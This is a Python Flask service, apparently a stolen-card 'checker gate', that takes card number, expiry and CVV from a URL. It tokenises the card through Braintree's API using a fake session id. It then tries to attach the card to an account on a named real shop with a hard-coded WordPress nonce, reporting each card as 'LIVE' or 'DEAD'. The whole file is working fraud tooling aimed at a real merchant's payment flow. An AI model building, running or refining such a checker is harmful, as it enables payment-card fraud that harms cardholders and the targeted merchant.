from flask import Flask, jsonify
import requests
import urllib.parse

app = Flask(__name__)

# === SITE KA PUBLIC CLIENT TOKEN ENDPOINT (VIDEO MEIN DIKHA) ===
CLIENT_TOKEN_URL = "https://www.tea-and-coffee.com/wp-json/wc-braintree/v1/client-token"

# === ADMIN AJAX URL (TERE DIYA HUA) ===
ADD_PAYMENT_URL = "https://www.tea-and-coffee.com/wp-admin/admin-ajax.php"

# === NONCE FOR _wpnonce (TERE REQUEST SE) ===
_WPNONCE = "9deae5d2bc"

def get_client_token():
    try:
        resp = requests.get(CLIENT_TOKEN_URL, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data")
    except:
        return None

def create_nonce(cc, mm, yy, cvv, client_token):
    try:
        url = "https://payments.braintree-api.com/graphql"
        headers = {
            "Braintree-Version": "2019-01-01",
            "Content-Type": "application/json"
        }
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "fake-session"},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCards(input: $input) { paymentMethod { id } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv
                    },
                    "clientToken": client_token
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        data = resp.json()
        if "data" in data and data["data"]["tokenizeCreditCards"]:
            return data["data"]["tokenizeCreditCards"]["paymentMethod"][0]["id"]
    except:
        pass
    return None

def add_payment_method(nonce):
    try:
        data = {
            'action': 'wc_braintree_add_payment_method',
            'payment_method_nonce': nonce,
            '_wpnonce': _WPNONCE
        }
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
            'origin': 'https://www.tea-and-coffee.com',
            'referer': 'https://www.tea-and-coffee.com/account/add-payment-method-custom'
        }
        resp = requests.post(ADD_PAYMENT_URL, data=data, headers=headers, timeout=15)
        result = resp.json()
        return result.get("success", False)
    except:
        return False

@app.route('/gate=braintreeauth/cc=<path:cc>', methods=['GET'])
def check_braintree(cc):
    try:
        # Fix URL encoding
        cc = urllib.parse.unquote(cc)
        parts = cc.split('|')
        if len(parts) != 4:
            return jsonify({"success": False, "data": {"error": {"message": "Invalid: cc|mm|yy|cvc"}}}), 400
        
        cc_num, mm, yy, cvv = [p.strip() for p in parts]
        
        # Step 1: Get Client Token
        client_token = get_client_token()
        if not client_token:
            return jsonify({"success": False, "data": {"error": {"message": "Token Error"}}}), 500
        
        # Step 2: Create Nonce
        nonce = create_nonce(cc_num, mm, yy, cvv, client_token)
        if not nonce:
            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Invalid Card"}}})
        
        # Step 3: Add Payment Method
        if add_payment_method(nonce):
            return jsonify({"success": True, "data": {"message": "LIVE - Card added!"}})
        else:
            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Card declined!"}}})
    
    except Exception as e:
        return jsonify({"success": False, "data": {"error": {"message": "Server Error"}}}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
